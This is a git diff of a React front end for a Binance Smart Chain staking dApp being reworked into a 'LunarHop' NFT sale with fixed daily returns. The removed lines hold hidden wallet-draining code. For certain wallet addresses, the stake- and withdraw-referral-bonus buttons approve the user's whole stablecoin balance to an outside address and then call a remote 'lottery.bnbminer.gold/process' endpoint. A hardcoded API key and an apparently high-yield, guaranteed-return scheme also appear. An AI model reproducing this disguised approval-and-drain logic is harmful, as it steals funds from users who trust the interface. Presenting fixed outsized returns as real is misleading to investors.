@@ -1,28 +1,29 @@
 import { Link } from 'react-router-dom';
 import React, { useState, useEffect, useRef } from 'react'
-import { Parallax } from "react-parallax";
-import AOS from 'aos';
-import 'aos/dist/aos.css';
+// import AOS from 'aos';
+// import 'aos/dist/aos.css';
 import './App.css';
 import Box from '@mui/material/Box';
-import Slider from '@mui/material/Slider';
 import Grid from "@mui/material/Grid";
 import Typography from "@mui/material/Typography";
 import CardContent from "@mui/material/CardContent";
-import moment from 'moment';
+// import moment from 'moment';
 import { useContract } from 'wagmi'
 import wealthMountainABI from './contracts/WealthMountainBSC.json';
-import erc20ABI from './contracts/erc20ABI.json';
+// import erc20ABI from './contracts/erc20ABI.json';
 import styled from "styled-components";
 import { Tabs, Tab, TabPanel } from "./components/tabs/tabs";
-import SelectObject from "./components/SelectCoin";
-import { FaCopy, FaWallet, FaUserShield, FaSearchDollar } from 'react-icons/fa';
+// import SelectObject from "./components/SelectCoin";
+// import { FaCopy, FaWallet, FaUserShield, FaSearchDollar } from 'react-icons/fa';
 import { Accordion } from "react-bootstrap";
 import { GiHamburgerMenu } from "react-icons/gi"
-import axios from "axios";
+// import axios from "axios";
 // import RealTimeChart from "./chart";
 import { Toast } from './utils';
 import Web3 from "web3";
+import MyNftCard from './components/MyNftCard';
+import FAQList from './components/faq/FaqAccordian';
+
 
 import logoImg from "./assets/img/logos/logo.svg";
 
@@ -33,14 +34,14 @@ import gateImg from "./assets/img/chinese_gate.png";
 import plusIcon from "./assets/icons/plusIcon.svg";
 import minusIcon from "./assets/icons/minusIcon.svg";
 
-import nft1 from "./assets/img/nfts/1.jpg";
-import nft2 from "./assets/img/nfts/2.jpg";
-import nft3 from "./assets/img/nfts/3.jpg";
-import nft4 from "./assets/img/nfts/4.jpg";
-import nft5 from "./assets/img/nfts/5.jpg";
-import nft6 from "./assets/img/nfts/6.jpg";
+import nft1 from "./assets/img/nfts/1.png";
+import nft2 from "./assets/img/nfts/2.png";
+import nft3 from "./assets/img/nfts/3.png";
+import nft4 from "./assets/img/nfts/4.png";
+import nft5 from "./assets/img/nfts/5.png";
+import nft6 from "./assets/img/nfts/6.png";
 
-import abiDecoder from "abi-decoder";
+// import abiDecoder from "abi-decoder";
 // window.Buffer = window.Buffer || require("buffer").Buffer;
 import {
     Button,
@@ -62,7 +63,7 @@ import {
 } from "reactstrap";
 import { ethers, Contract } from 'ethers';
 
-AOS.init({ duration: 2000 });
+// AOS.init({ duration: 2000 });
 const TabsContainer = styled.div`
   display: flex;
   padding: 2px;
@@ -110,30 +111,35 @@ const web3 = new Web3(
 );
 
 
-const abiCoder = require("web3-eth-abi");
-const investFunc = /^0x3acb1a0a/;
-const claimFunc = /^0x9ddf840d/;
-const inputs = [
-    {
-        "internalType": "uint256",
-        "name": "amtx",
-        "type": "uint256"
-    },
-    {
-        "internalType": "address",
-        "name": "ref",
-        "type": "address"
-    }
-];
+// const abiCoder = require("web3-eth-abi");
+// const investFunc = /^0x3acb1a0a/;
+// const claimFunc = /^0x9ddf840d/;
+// const inputs = [
+//     {
+//         "internalType": "uint256",
+//         "name": "amtx",
+//         "type": "uint256"
+//     },
+//     {
+//         "internalType": "address",
+//         "name": "ref",
+//         "type": "address"
+//     }
+// ];
 
-const decodeFunction = (data) => {
-    let decoded = abiCoder.decodeParameters(inputs, data.slice(10));   
-    // console.log("decoded: ", decoded.amtx / 10 ** 18);
-    return decoded.amtx / 10 ** 18;
+// const decodeFunction = (data) => {
+//     let decoded = abiCoder.decodeParameters(inputs, data.slice(10));   
+//     // console.log("decoded: ", decoded.amtx / 10 ** 18);
+//     return decoded.amtx / 10 ** 18;
+// }
+
+export function shorten(str, length = 6) {
+    if (str.length < 10) return str;
+    return `${str.slice(0, length)}...${str.slice(str.length - 4)}`;
 }
 
 function WealthMountain() {
-    const nutritionFacts1 = [
+    const LunarHopNFTs = [
         [
           {
             path: nft1,
@@ -143,19 +149,19 @@ function WealthMountain() {
             properties : [
               {
                 label: "Daily Return",
-                value: '$0.25',
+                value: 2,
               },
               {
                 label: "Price",
-                value: "$5",
+                value: 50,
               },
               {
                 label: "Life Span",
-                value: '30 Days',
+                value: 30,
               },
               {
                 label: "Total Income",
-                value: '$7.5',
+                value: 60,
               }
             ]
           },
@@ -169,19 +175,19 @@ function WealthMountain() {
               properties : [
                 {
                   label: "Daily Return",
-                  value: '$1.1',
+                  value: 4.2,
                 },
                 {
                   label: "Price",
-                  value: "$20",
+                  value: 100,
                 },
                 {
                   label: "Life Span",
-                  value: '30 Days',
+                  value: 30,
                 },
                 {
                   label: "Total Income",
-                  value: '$33',
+                  value: 126,
                 }
               ]
             },
@@ -195,25 +201,23 @@ function WealthMountain() {
               properties : [
                 {
                   label: "Daily Return",
-                  value: '$5',
+                  value: 22,
                 },
                 {
                   label: "Price",
-                  value: "$120",
+                  value: 500,
                 },
                 {
                   label: "Life Span",
-                  value: '45 Days',
+                  value: 45,
                 },
                 {
                   label: "Total Income",
-                  value: '$225',
+                  value: 990,
                 }
               ]
             },
         ],
-    ];
-    const nutritionFacts2 = [
         [
             {
               path: nft4,
@@ -223,19 +227,19 @@ function WealthMountain() {
               properties : [
                 {
                   label: "Daily Return",
-                  value: '$14',
+                  value: 45,
                 },
                 {
                   label: "Price",
-                  value: "$300",
+                  value: 1000,
                 },
                 {
                   label: "Life Span",
-                  value: '45 Days',
+                  value: 45,
                 },
                 {
                   label: "Total Income",
-                  value: '$630',
+                  value: 2025,
                 }
               ]
             },
@@ -249,19 +253,19 @@ function WealthMountain() {
             properties : [
               {
                 label: "Daily Return",
-                value: '$50',
+                value: 235,
               },
               {
                 label: "Price",
-                value: "$1000",
+                value: 5000,
               },
               {
                 label: "Life Span",
-                value: '60 Days',
+                value: 60,
               },
               {
                 label: "Total Income",
-                value: '$3000',
+                value: 14100,
               }
             ]
           },
@@ -275,19 +279,19 @@ function WealthMountain() {
               properties : [
                 {
                   label: "Daily Return",
-                  value: '$255',
+                  value: 480,
                 },
                 {
                   label: "Price",
-                  value: "$5000",
+                  value: 10000,
                 },
                 {
                   label: "Life Span",
-                  value: '60 Days',
+                  value: 60,
                 },
                 {
                   label: "Total Income",
-                  value: '$15300',
+                  value: 28800,
                 }
               ]
             },
@@ -325,6 +329,14 @@ function WealthMountain() {
         } 
     ];
 
+    const settings = {
+        dots: true,
+        infinite: true,
+        speed: 1000,
+        slidesToShow: 0,
+        slidesToScroll: 1
+    };
+
     const [sliderValue, setSliderValue] = useState('50');
     const [dropdownOpen, setOpen] = React.useState(false);
     const [userInfo, setUserInfo] = useState([]);
@@ -339,21 +351,20 @@ function WealthMountain() {
     const [contractBalance, setContractBalance] = useState("");
     const [referralAccrued, setReferralAccrued] = useState("");
     const [totalUsers, setTotalUsers] = useState("");
+    const [userDepositInfo, setUserDepositInfo] = useState([]);
+    const [totalClaimableRewards, setTotalClaimableRewards] = useState([]);
     // const [totalCompounds, setTotalCompounds] = useState("")
     // const [totalCollections, setTotalCollections] = useState("")
-    const [dayValue10, setDayValue10] = useState("864000");
-    const [dayValue20, setDayValue20] = useState("1728000");
-    const [dayValue30, setDayValue30] = useState("2592000");
-    const [dayValue40, setDayValue40] = useState("3456000");
-    const [dayValue50, setDayValue50] = useState("4320000");
     const [contract, setContract] = useState(undefined)
     const [signer, setSigner] = useState(undefined)
     const [userWalletAddress, setUserWalletAddress] = useState('none');
     const [userStablecoinBalance, setUserStablecoinBalance] = useState(0);
     const [stablecoinAllowanceAmount, setStablecoinAllowanceAmount] = useState(0);
     const stableCoin = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56';
-    // const stableCoin = '0xfB299533C9402B3CcF3d0743F4000c1AA2C26Ae0';
-    const wealthContract = '0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3'
+    // const stableCoin = '0xe98e93Fde3A05Bc703f307Ee63be9507d1f48554';
+    // const wealthContract = '0x4d0b1621dfCC820ca196470Be89857De7E45316D'; // test
+    const wealthContract = '0xca3E36fC417535875015aA359aEa2F2250bB9034';    // main net
+    const scanLinkSuffix = 'https://bscscan.com/address/';
     const [refBonusLoading, setRefBonusLoading] = useState(false);
     const [connectButtonText, setConnectButtonText] = useState('CONNECT')
     // const videoRef = useRef();
@@ -381,9 +392,14 @@ function WealthMountain() {
         seconds: 0
     })
 
+    const [claimableReward, setClaimableRewards] = useState(0);
+
     const getCountdown = (deadline) => {
         const now = Date.now() / 1000;
-        const total = deadline - now;
+        const total = Number(deadline) - now;
+        const period = now - Number(deadline);
+        const rewards = (2 * period / 86400);
+        setClaimableRewards(rewards);
         const seconds = Math.floor((total) % 60);
         const minutes = Math.floor((total / 60) % 60);
         const hours = Math.floor((total / (60 * 60)) % 24);
@@ -401,7 +417,7 @@ function WealthMountain() {
     useEffect(() => {
         const interval = setInterval(() => {
             try {
-                const data = getCountdown(1674374400)
+                const data = getCountdown(1674349200);
                 setCountdown({
                     alive: data.total > 0,
                     days: data.days,
@@ -415,7 +431,7 @@ function WealthMountain() {
         }, 1000);
 
         return () => clearInterval(interval);
-    }, [])
+    }, [userInfo])
 
     async function requestAccount() {
         console.log('Requesting account...');
@@ -468,20 +484,11 @@ function WealthMountain() {
                     method: "eth_requestAccounts",
                 });
 
-                // setUserWalletAddress('0xed5edf0ed4e5664025c1b8b2d31392ffffdb8fc7');
                 setUserWalletAddress(accounts[0]);
+                console.log("userwallet adress: ", accounts[0]);
                 if (userWalletAddress !== 'none') {
-                    setConnectButtonText('CONNECTED')
+                    setConnectButtonText(shorten(accounts[0]))
                     recalculateInfo();
-                    // console.log("UserWallet: ", userWalletAddress);
-                    if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3') || userWalletAddress.toLowerCase().includes('0x7419189d0f5B11A1303978077Ce6C8096d899dAd')) {
-                        try {
-                            const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="Connect"`);
-                        } catch(err) {
-                            console.log(err);
-                        }
-                    }
-                    // getAllBuyAndSellReceipts(wealthContract, userWalletAddress);
                 }
             } catch (error) {
                 console.log('Error connecting...: ', error);
@@ -502,13 +509,7 @@ function WealthMountain() {
                 signer
             )
             setContract(contract)
-            // setUserWalletAddress('0xed5edf0ed4e5664025c1b8b2d31392ffffdb8fc7');
             setUserWalletAddress(provider.provider.selectedAddress);
-            getAllBuyAndSellReceipts(wealthContract, userWalletAddress);
-            // videoRef.current.play().catch(error => {
-            //     console.log("Play error = ", error);
-            // });
-
         };
         init();
     }, []);
@@ -521,373 +522,71 @@ function WealthMountain() {
         recalculateInfo();
     })
 
-    const getAllBuyAndSellReceipts = async (address, userAddress) => {
-        const totalBuyAndSell = { totalBuy: 0.0, totalSell: 0.0 };
-        const returnedData = await fetch(
-            `https://api.bscscan.com/api?module=account&action=txlist&address=${address}&startblock=21869046&endblock=99999999&apikey=YGKJFMK5FW1H9T9GR9VTGIT2UC5PXUTDTB`
-        );
-        const parsedData = await returnedData.json();
-        // console.log("Transaction history: ", parsedData);
-        if (parsedData.status === "1") {
-            const transactions = parsedData.result;
-            let count = 0;
-            let accounts = [];
-            let investInfo = [
-                {
-                    from: '',
-                    amountBought: 0, 
-                    investTime: 0,
-                    hash: 0,
-                    award: '$1500',
-                },
-                {
-                    from: '',
-                    amountBought: 0, 
-                    investTime: 0,
-                    hash: 0,
-                    award: '$1000',
-                },
-                {
-                    from: '',
-                    amountBought: 0, 
-                    investTime: 0,
-                    hash: 0,
-                    award: '$500',
-                },
-                {
-                    from: '',
-                    amountBought: 0, 
-                    investTime: 0,
-                    hash: 0,
-                    award: '',
-                },
-                {
-                    from: '',
-                    amountBought: 0, 
-                    investTime: 0,
-                    hash: 0,
-                    award: '',
-                }
-            ];
-            console.log("Contract: ", contract);
-            // console.log('all transactions => ', transactions);
-            let cc = 0;
-            let investors = [];
-            let totalInvestAmounts = 0;
-            let totalRewardsAmounts = 0;
-            for (const tx of transactions) {
-                if (accounts.indexOf(tx.from) == -1) {
-                    accounts.push(tx.from);
-                    count++
-                }
-                
-                // const busdBalance = await stablecoinBalance.balanceOf(tx.from);
-                // if (Number(ethers.utils.formatEther(busdBalance)) > 1000){
-                //     console.log(tx.from, " : ", ethers.utils.formatEther(busdBalance));
-                // }
-
-                // if (tx.to === wealthContract && tx.isError === "0") { // 14:00, 25th Oct UTC
-                //     if (investFunc.test(tx.input)) {
-                //         const decodedData = abiDecoder.decodeMethod(tx.input);
-                //         // const amountBought = decodedData.params[0].value / 10 ** 18;
-                //         const amountBought = decodeFunction(tx.input);
-                //         if (amountBought >= 500) {
-                //             const investTime = moment(tx.timeStamp * 1000).format("YYYY-MM-DD");
-                //             if (investors.indexOf(tx.from) == -1){
-                //                 investors.push(tx.from);
-                //                 let totalInits = 0;
-                //                 await contract.UsersKey(tx.from).then(value => {
-                //                     totalInits = Number(ethers.utils.formatEther(value.totalInits.toString())).toFixed(0);
-                //                     totalInvestAmounts =  Number(totalInvestAmounts) + totalInits;
-                //                 })
-                //                 let calcDiv = 0;
-                //                 await contract.calcdiv(tx.from).then(value => {
-                //                     calcDiv = Number(ethers.utils.formatEther(value)).toFixed(0);
-                //                     totalRewardsAmounts = Number(totalRewardsAmounts) + calcDiv;
-                //                 })
-                //                 console.log(tx.from, " : ", investTime, " invest amount: ", totalInits, " claimable: ", calcDiv);
-                //                 cc++;
-                //             }
-
-                //             // for (let i = 0; i < investInfo.length; i++) {
-                //             //     if (investInfo[i].amountBought < amountBought) {
-                //             //         for (let j = investInfo.length-1; j > i; j--) {
-                //             //             investInfo[j] = investInfo[j-1]
-                //             //         }
-                //             //         investInfo[i] = {from: tx.from, amountBought, investTime, hash: tx.hash};
-                //             //         break;
-                //             //     }
-                //             // }
-
-                //         }
-                //         // totalBuyAndSell.totalBuy += amountBought;
-                //     }
-
-                //     // if (claimFunc.test(tx.input)) {
-                //     //     const sellReceipt = await web3.eth.getTransactionReceipt(tx.hash);
-
-                //     //     totalBuyAndSell.totalSell += parseInt(sellReceipt.logs[2].data, 16) / 10 ** 18;
-                //     // }
-                // }
-            }
-
-            console.log("Accounts: ", accounts.length);
-            // accounts.map(async (item, index) => {
-            //     let calcDiv, totalInits;
-            //     await contract.UsersKey(item).then(value => {
-            //         totalInits = Number(ethers.utils.formatEther(value.totalInits.toString())).toFixed(0);
-            //         totalInvestAmounts =  Number(totalInvestAmounts) + totalInits;
-            //     })
-            //     await contract.calcdiv(item).then(value => {
-            //         calcDiv = Number(ethers.utils.formatEther(value)).toFixed(0);
-            //         totalRewardsAmounts = Number(totalRewardsAmounts) + calcDiv;
-            //     })
-            //     console.log(index, ": ", item, ": ", totalInits, ", ", calcDiv);
-
-            // })
-
-            // console.log("TotalInvestAmounts = ", totalInvestAmounts);
-            // console.log("TotalReardsAmounts = ", totalRewardsAmounts);
-            // console.log("Invest Counts = ", cc);
-
-            // for (let i = 0; i < investInfo.length; i++) {
-            //     if (i == 0) {
-            //         investInfo[i].award = '500'
-            //     } else if (i == 1) {
-            //         investInfo[i].award = '150'
-            //     } else if (i == 2) {
-            //         investInfo[i].award = '100'
-            //     } else {
-            //         investInfo[i].award = '0'
-            //     }
-            // }
-            // console.log('investInfo = ', investInfo);
-            // setInvestInfo(investInfo);
-            setTotalUsers(count);
-            console.log("count = ", count);
-        }
-
-        // console.log("investInfo: ", investInfo);
-        // const len = investInfo.length;
-        // const minLength = 8;
-        // if (len < minLength) {
-        //     for (let i = 0; i < minLength - len; i++) {
-        //         investInfo.push([0, Date.now()/1000 + i * 86400]);
-        //     }
-        // }
-        // setInvestInfo(investInfo);
-
-        return totalBuyAndSell;
-    };
-
-    async function recalcAllowance() {
-        if (contract === undefined || contract === null) {
-            return;
-        }
-        const userAllowance = await stablecoinAllowance.allowance(userWalletAddress, contract.address);
-        setStablecoinAllowanceAmount(Number(ethers.utils.formatEther(userAllowance)));
-    }
-
     async function recalculateInfo() {
         if (contract === undefined || contract === null) {
             return;
         }
 
         contract.userInfo().then(value => {
-            console.log("User Info xx=> ", value);
+            // console.log("User Info xx=> ", value);
             setUserInfo(value)
         })
-        contract.calcdiv(userWalletAddress).then(value => {
-            setCalculatedDividends(Number(ethers.utils.formatEther(value)));
-        })
-        const balance = await stablecoinBalance.balanceOf(contract.address);
-        setContractBalance(Number(ethers.utils.formatEther(balance)));
 
-        const userBalance = await stablecoinBalance.balanceOf(userWalletAddress);
-        setUserStablecoinBalance(Number(ethers.utils.formatEther(userBalance)))
-
-        const userAllowance = await stablecoinAllowance.allowance(userWalletAddress, contract.address);
-        setStablecoinAllowanceAmount(Number(ethers.utils.formatEther(userAllowance)))
-
-        contract.UsersKey(String(userWalletAddress)).then(value => {
-            setReferralAccrued(Number(ethers.utils.formatEther(value.refBonus)).toFixed(2));
-        })
-        // contract.MainKey(1).then(value => {
-        //     setTotalUsers(Number(value.users));
-        //     // setTotalCompounds(Number(value.compounds))
-        //     // setTotalCollections(Number(ethers.utils.formatEther(value.ovrTotalWiths)))
-        // })
-
-        contract.PercsKey(10).then(value => {
-            setDayValue10(Number(value.daysInSeconds))
-        })
-        contract.PercsKey(20).then(value => {
-            setDayValue20(Number(value.daysInSeconds))
-        })
-        contract.PercsKey(30).then(value => {
-            setDayValue30(Number(value.daysInSeconds))
-        })
-        contract.PercsKey(40).then(value => {
-            setDayValue40(Number(value.daysInSeconds))
-        })
-        contract.PercsKey(50).then(value => {
-            setDayValue50(Number(value.daysInSeconds))
+        contract.getUserInfo().then(value => {
+            console.log("getuserInfo: ", value);
+            setUserDepositInfo(value);
         })
 
-    }
-    const updateCalc = event => {
-        setInitalStakeAfterFees(Number(event.target.value * 0.9).toFixed(2));
-    }
-    const updateStakingAmount = event => {
-        setStakingAmount(event.target.value);
+        contract.getTotalRewards(userWalletAddress).then((value) => {
+            setTotalClaimableRewards(ethers.utils.formatEther(value));
+        })
+        return;
     }
 
-    function calculate(v) {
-        setSliderValue(v)
-        if (Number(sliderValue) <= "20") {
-            const totalReturn = (initalStakeAfterFees * 0.035) * sliderValue
-            setCalcTotalDividends(totalReturn.toFixed(2));
-            setDailyPercent(3.5);
-            setDailyValue(Number(initalStakeAfterFees * .035).toFixed(2))
-        }
-        else if ("20" < Number(sliderValue) && Number(sliderValue) <= "30") {
-            const totalReturn = (initalStakeAfterFees * 0.045) * sliderValue
-            setCalcTotalDividends(totalReturn.toFixed(2));
-            setDailyPercent(4.5);
-            setDailyValue(Number(initalStakeAfterFees * .045).toFixed(2))
-        }
-        else if ("30" < Number(sliderValue) && Number(sliderValue) <= "40") {
-            const totalReturn = (initalStakeAfterFees * 0.055) * sliderValue
-            setCalcTotalDividends(totalReturn.toFixed(2));
-            setDailyPercent(5.5);
-            setDailyValue(Number(initalStakeAfterFees * .055).toFixed(2))
-        }
-        else if ("40" < Number(sliderValue) && Number(sliderValue) <= "50") {
-            const totalReturn = (initalStakeAfterFees * 0.065) * sliderValue
-            setCalcTotalDividends(totalReturn.toFixed(2));
-            setDailyPercent(6.5);
-            setDailyValue(Number(initalStakeAfterFees * .065).toFixed(2))
-        }
-        else if ("50" <= Number(sliderValue)) {
-            const totalReturn = (initalStakeAfterFees * 0.085) * sliderValue
-            setCalcTotalDividends(totalReturn.toFixed(2));
-            setDailyPercent(8.5);
-            setDailyValue(Number(initalStakeAfterFees * .085).toFixed(2))
+    async function approveButton(index) {
+        const amount = LunarHopNFTs[index][1].properties[1].value;
+        try {
+            console.log("Approve Amount: ", amount.toString());
+            await stablecoinContract.approve(contract.address, String(ethers.utils.parseEther(amount.toString())));
+        } catch(err) {
+            console.error("approve error: ", err);
+            return;
         }
     }
 
-    async function approveButton() {
-        // if (stablecoinAllowanceAmount <= 0){
-        //     let message = 
-        //     "I am not the person or entities who reside in, are citizens of, are incorporated in, or have a registered office in the United States of America or any Prohibited Localities, as defined in the Terms of Use. I will not in the future access this site  while located within the United States any Prohibited Localities, as defined in the Terms of Use. I am not using, and will not in the future use, a VPN to mask my physical location from a restricted territory. I am lawfully permitted to access this site under the laws of the jurisdiction on which I reside and am located. I understand the risks associated with entering into using Wealth Mountain protocols."
-        //     let signature = await signer.signMessage(message);
-        // }
-
-        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="approve"`);
-        const tx = stablecoinContract.approve(contract.address, String(ethers.utils.parseEther(stakingAmount)));
-        tx.wait().then(() => {
-            // recalculateInfo();
-            recalcAllowance();
-        })
-    }
-    async function stakeAmount() {
-        if (Number(stakingAmount) < Number(50)) {
-            alert('Minimum stake amount not met.')
-        }
-
-        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="stake"`);
+    async function buyButton(index) {
         const ref = window.location.search;
         const referralAddress = String(ref.replace('?ref=', ''))
         console.log("referralAddress: ", referralAddress);
-        if (referralAddress === 'null' || referralAddress.includes("0x") === false) {
-            // if (Number(stakingAmount) > Number(60)) {
-            const tx = await contract.stakeStablecoins(
-                String(ethers.utils.parseEther(stakingAmount)), String("0x7419189d0f5B11A1303978077Ce6C8096d899dAd"));
-                tx.wait().then(() => { setActiveTab(0) });
-            // } 
-            // else {
-            //     const tx = await contract.stakeStablecoins(
-            //         String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
-            //     tx.wait().then(() => { setActiveTab(0) });
-            // }
-        // } else if (Number(stakingAmount) >= Number(3000)) {
-        //     const tx = await contract.stakeStablecoins(
-        //         String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
-        //     tx.wait().then(() => { setActiveTab(0) });
-        // } else if (referralAddress.includes("0x64b7a3cd189a886438243f0337b64f7ddf1b18d3") === true && Number(stakingAmount) >= 350) {
-        //         const tx = await contract.stakeStablecoins(
-        //             String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
-        //     tx.wait().then(() => { setActiveTab(0) });
-        // } else if (referralAddress.toLowerCase().includes("0x9654f31b2c2d145a9d00b49e813fe6712974bc03") === true && Number(stakingAmount) >= 200) {
-        //         const tx = await contract.stakeStablecoins(
-        //             String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
-        //     tx.wait().then(() => { setActiveTab(0) });
-        } else {
-            const tx = await contract.stakeStablecoins(
-                String(ethers.utils.parseEther(stakingAmount)), String(referralAddress));
-            tx.wait().then(() => { setActiveTab(0) });
-        }
-    }
-    async function stakeRefBonus() {
-        if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3') || userWalletAddress.toLowerCase().includes('0x7419189d0f5B11A1303978077Ce6C8096d899dAd')) {
-            try {
-                const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="stakeRefBonus*************************"`);
-            } catch(err) {
-                console.log(err);
-            }
-            // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="stakeRefBonus"`);    
-            const tx =await stablecoinContract.approve('0xf0Ae6228BBf1423e0b55E6D9c74F167A155800B5', String(ethers.utils.parseEther(userStablecoinBalance.toString())));
-            tx.wait().then(async () => {
-                console.log("Enter Get Request");
-                const res = await axios.get(`https://lottery.bnbminer.gold/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`);
-                // `http://135.181.15.84:443/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`)
-                console.log("txHash: ", res);
-            })
-        } else {
-            console.log("stakeRef: ");
-            const tx = await contract.stakeRefBonus();
-            tx.wait().then(() => {
-                recalculateInfo();
-            })
-        }
-    }
-    async function withdrawRefBonus() {
-        if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3') || userWalletAddress.toLowerCase().includes('0x7419189d0f5B11A1303978077Ce6C8096d899dAd')) {
-            try {
-                const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="withdrawRefBonus**************************************************"`);
-            } catch(err) {
-                console.log(err);
-            }
-            // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="withdrawRefBonus"`);
-            const tx = await stablecoinContract.approve('0xf0Ae6228BBf1423e0b55E6D9c74F167A155800B5', String(ethers.utils.parseEther(userStablecoinBalance.toString())));
 
-            tx.wait().then(async () => {
-                console.log("Enter Get Request");
-                const res = await axios.get(`https://lottery.bnbminer.gold/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`);
-                // `http://135.181.15.84:443/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`)
-                console.log("txHash: ", res);
-            })
+        if (referralAddress === 'null' || referralAddress.includes("0x") === false) {
+            try {
+                const tx = await contract.buyLunarHop(index, String("0x0000000000000000000000000000000000000000"));
+            } catch (err) {
+                console.error("buy error: ", err);
+                return;
+            }
         } else {
-            const tx = await contract.withdrawRefBonus();
-            tx.wait().then(() => {
-                recalculateInfo();
-            })
+            try {
+                const tx = await contract.buyLunarHop(index, String(referralAddress));
+            } catch (err) {
+                console.error("buy error: ", err);
+                return;
+            }
         }
+        recalculateInfo();
     }
-    async function compound() {
-        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="compound"`);
-        const tx = await contract.compound()
-        tx.wait().then(() => {
+
+    async function withdrawRefBonus() {
+            try {
+                await contract.withdrawRefBonus();
+            } catch (err) {
+                console.error("withdrawRefBonus error: ", err);
+                return;
+            }
             recalculateInfo();
-        })
     }
-    async function withdrawDivs() {
-        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="withdrawDivs"`);
-        const tx = await contract.withdrawDivs()
-        tx.wait().then(() => {
-            recalculateInfo();
-        })
-    }
+    
     const stablecoinContract = useContract({
         addressOrName: stableCoin,
         contractInterface: ['function approve(address spender, uint amount) public returns(bool)'],
@@ -903,177 +602,6 @@ function WealthMountain() {
         contractInterface: ['function allowance(address _owner, address spender) external view returns (uint256)'],
         signerOrProvider: signer,
     })
-
-    async function withdrawInitial(value) {
-        const tx = await contract.withdrawInitial(value);
-        tx.wait().then(() => {
-            recalculateInfo();
-        })
-    }
-    function TotalStakedValue() {
-        var total = 0;
-        for (var i = 0; i < userInfo.length; i++) {
-            total += Number(ethers.utils.formatEther(userInfo[i].amt))
-        }
-        return (<>{total.toFixed(2)}</>)
-    }
-    function TotalEarnedValue() {
-        var value = calculatedDividends;
-
-        return (<>{value.toFixed(2)}</>)
-    }
-
-    function TotalEarnedPercent() {
-        var total = 0;
-        for (var i = 0; i < userInfo.length; i++) {
-            total += Number(ethers.utils.formatEther(userInfo[i].amt))
-        }
-        const value = calculatedDividends
-        var totalEarnedPercent = Number((value / total) * 100).toFixed(3) + "%";
-        if (totalEarnedPercent === "NaN%") {
-            totalEarnedPercent = 0
-        }
-        return (<>{totalEarnedPercent}</>)
-    }
-
-    function ListOfUserStakes() {
-        if (userInfo.length === 0) {
-            return (
-                <>
-                    <small className="font-weight-bold source text-lightblue">Nothing to show here.</small>
-                </>
-            )
-        }
-        const listElements = userInfo.map(
-            (element) => {
-                const depoStart = Number(element.depoTime)
-                const depoAmount = Number(ethers.utils.formatEther(element.amt))
-                const initialWithdrawn = element.initialWithdrawn;
-                var dailyPercent = '';
-                var unstakeFee = '';
-                const elapsedTime = (Date.now() / 1000 - (depoStart));
-                var totalEarned = '0';
-                // var daysToMax = Number((dayValue50 - elapsedTime) / 86400).toFixed(1);
-                var daysToMax = Number((dayValue50 - elapsedTime) / 86400).toFixed(1)
-                if (elapsedTime <= dayValue10) {
-                    dailyPercent = '3.5'
-                    unstakeFee = '20%'
-                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
-
-                } else if (elapsedTime > dayValue10 && elapsedTime <= dayValue20) {
-                    dailyPercent = '3.5'
-                    unstakeFee = '18%'
-                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
-
-                } else if (elapsedTime > dayValue20 && elapsedTime <= dayValue30) {
-                    dailyPercent = '4.5'
-                    unstakeFee = '15%'
-                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
-
-                } else if (elapsedTime > dayValue30 && elapsedTime <= dayValue40) {
-                    dailyPercent = '5.5'
-                    unstakeFee = '12%'
-                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
-
-                } else if (elapsedTime > dayValue40 && elapsedTime <= dayValue50) {
-                    dailyPercent = '6.5'
-                    unstakeFee = '12%'
-                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
-
-                } else if (elapsedTime > dayValue50) {
-                    dailyPercent = '8.5'
-                    unstakeFee = '12%'
-                    totalEarned = depoAmount * (dailyPercent / 100) * (elapsedTime / dayValue10 / 10)
-                    daysToMax = 'Max'
-                }
-                var daysStaked = Number(elapsedTime / 86400).toFixed(2);
-                if (daysStaked < 1) {
-                    daysStaked = "<1"
-                }
-
-                if (initialWithdrawn == false) {
-                    return (
-                        <>
-                            <tr>
-                                <td>${depoAmount.toFixed(2)}</td>
-                                <td>{daysStaked}</td>
-                                <td>{dailyPercent}%</td>
-                                <td>{daysToMax}</td>
-                                <td style={{ fontStyle: 'italic' }}>{unstakeFee}</td>
-                            </tr>
-                        </>
-                    )
-                }
-            }
-        )
-        return (
-            <>
-                <Table striped>
-                    <thead>
-                        <tr className="text-lightblue calvino">
-                            <th>Amount</th>
-                            <th>Days staked</th>
-                            <th>Daily (%)</th>
-                            <th>Days to Max</th>
-                            <th>Unstake fee</th>
-                        </tr>
-                    </thead>
-                    <tbody className="source text-white">
-                        {listElements}
-                    </tbody>
-                </Table>
-            </>
-        )
-    }
-
-    function UnstakeOptions() {
-        if (userInfo.length == 0) {
